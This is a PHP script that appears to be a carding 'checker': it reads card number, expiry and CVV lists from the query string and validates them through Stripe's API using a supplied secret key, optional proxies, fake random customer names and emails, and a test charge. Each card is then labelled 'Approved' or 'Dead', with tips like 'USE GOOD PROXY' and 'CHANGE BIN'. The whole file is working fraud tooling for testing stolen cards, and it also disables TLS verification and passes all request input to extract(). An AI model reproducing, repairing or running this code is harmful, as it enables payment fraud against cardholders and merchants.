<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function RandomString($length = 23) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@olxbg.cf';
}
$sec1 = $_GET['sec'];
extract($_GET);
$check = str_replace(" ", "", htmlspecialchars($check));
$lista = str_replace(" " , "", $lista);
$i = explode("|", $lista);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");
fwrite(fopen('cookie.txt', 'w'), "");
$name = RandomString();
$lastname = RandomString();
$proxySocks4 = $_GET['proxy'];

$charges = array("2.1$","0.8$","3$","2.7$","5.4$","3.3$","4$","2.1$","6$","0.5$","1.8$","2.7$","2.5$","3.3$","4.1$");
$charge = $charges[array_rand($charges)];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers'); ////To generate customer id
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Doc Production');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);

$id = trim(strip_tags(getstr($f,'"id": "','"')));

$ch = curl_init();
if (isset($proxySocks4)) {    // If the $proxy variable is set, then
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);    // Set CURLOPT_PROXY with proxy in $proxy variable
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents'); ////To generate payment token [It wont charge]
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[card][exp_year]='.$yyyy.'&payment_method_data[card][cvc]='.$cvv.'');
 $result = curl_exec($ch);

$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 $c = json_decode(curl_exec($ch), true);
curl_close($ch);

 $pam = trim(strip_tags(getstr($result,'"payment_method": "','"')));

  $cvv = trim(strip_tags(getstr($result,'"cvc_check": "','"')));

if ($c["status"] == "succeeded") {
    
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    
    curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
    
   $result = curl_exec($ch);
    curl_close($ch);
    
    // $pm = $c["payment_method"];

    $ch = curl_init();
if (isset($proxySocks4)) {    // If the $proxy variable is set, then
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);    // Set CURLOPT_PROXY with proxy in $proxy variable
}

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
 $d = $result;
 $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
   $attachment_to_her;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1000&currency=usd&customer='.$id.'');
echo $result = curl_exec($ch);

    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass") {
        echo '<tr><td><span class="badge badge-success">Aprovada</span></td><td>'.$lista.'</td><td><span class="badge badge-success">Approved [XCODE] [CVV MATCHED] [Charged: '.$charge.']</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
    } elseif (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "unchecked") {
     echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Dead ☠ [XCODE]Unavailable Card [USE GOOD PROXY]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
     
    } else {
    
     echo '<tr><td><span class="badge badge-warning">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">[XCODE]Unavailable Card [USE GOOD PROXY] [Charged: '.$charge.']</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
    
    }
    
}
elseif(strpos($result, '"cvc_check": "pass"')){

     echo '<tr><td><span class="badge badge-success">Aprovada</span></td><td>'.$lista.'</td><td><span class="badge badge-success">Approved  [XCODE] [CVV Matched] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] [Not Charged]</i></font></span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';

} 
elseif(strpos($result, 'security code is incorrect')){
    echo '<tr><td><span class="badge badge-success">Aprovada</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Approved  [XCODE] [CCN LIVE] [Not Charged]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
 

} 
elseif (isset($c["error"])) {
    if ($c["error"]["decline_code"] == "Your card's security code is incorrect.") {
           echo '<tr><td><span class="badge badge-success">Aprovada</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Approved  [XCODE] Your cards security code is incorrect.[CCN LIVE] [Not Charged]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
    }
        else{
        echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">Dead ☠ [XCODE] ' . $c["error"]["message"] . ' ' . $c["error"]["decline_code"] . ' [Not Charged]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
}
}
else {
  echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">USE GOOD PROXY/CHANGE BIN</span></td><td></td></tr>';
}


// if (strpos($result, '"cvc_check": "pass"')) {
//   echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-success">Card Approved and cvc check passed </span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }elseif (strpos($result, "incorrect_cvc")) {
//   echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Card Approved cvv check failed</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }elseif (strpos($result,'Your card has insufficient funds.')) {
//   echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-success">[Message] Your card has insufficient funds. </span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }elseif (strpos($result, '"cvc_check": "unavailable"')) {
//   echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">[Message] Your card was declined. [D-Code] Authorize Declined</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }else{
//   echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">'.$err.'</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }
// }else{
//   echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">'.$err.' </span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';

// }
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');

curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
?>